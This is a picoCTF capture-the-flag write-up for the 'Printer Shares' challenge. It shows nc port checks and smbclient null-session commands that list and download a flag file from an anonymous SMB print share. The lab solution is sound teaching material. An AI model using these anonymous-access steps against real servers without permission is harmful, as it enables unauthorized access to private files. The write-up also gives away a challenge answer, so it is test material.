# Printer Shares

**Link**: https://play.picoctf.org/practice/challenge/759

**Difficulty**: easy

## Description

Oops! Someone accidentally sent an important file to a network printer—can you
retrieve it from the print server?

## Resources

None — everything happens over the network. The instance exposes an **SMB** print
server.

## How to solve

1. Confirm the port is open (the challenge hands you host/port):

       nc -vz mysterious-sea.picoctf.net PORT

2. **List the SMB shares** with `smbclient` using a null session (`-N` = no
   password):

       smbclient -L //mysterious-sea.picoctf.net -p PORT -N

   This lists the available shares (e.g. a `shares` / print share).

3. **Connect to the interesting share:**

       smbclient //mysterious-sea.picoctf.net/shares -p PORT -N

4. Inside the `smb: \>` prompt, list and **download** the file (SMB doesn't print
   file contents inline — you `get` it to disk first, then read it locally):

       smb: \> ls
       smb: \> get flag.txt
       getting file \flag.txt of size 37 as flag.txt (…)
       smb: \> exit

5. Read the downloaded file:

       cat flag.txt

## Flag

    picoCTF{...}   (contents of the retrieved flag.txt)
